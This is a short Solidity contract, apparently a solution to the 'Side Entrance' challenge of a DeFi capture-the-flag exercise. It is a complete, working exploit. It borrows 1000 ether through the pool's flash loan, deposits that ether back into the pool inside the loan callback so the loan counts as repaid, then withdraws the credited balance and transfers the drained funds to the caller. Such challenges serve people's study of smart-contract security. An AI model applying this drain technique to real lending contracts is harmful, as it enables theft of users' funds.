pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack {

  SideEntranceLenderPool public immutable pool;

  constructor(address _pool) {
    pool = SideEntranceLenderPool(_pool);
  }

  function attack() external {
    pool.flashLoan(1000 ether);
    pool.withdraw();
    payable(msg.sender).transfer(address(this).balance);
  }

  function execute() external payable {
    require(msg.sender == address(pool));
    pool.deposit{value: msg.value}();
  }

  receive() external payable {}
}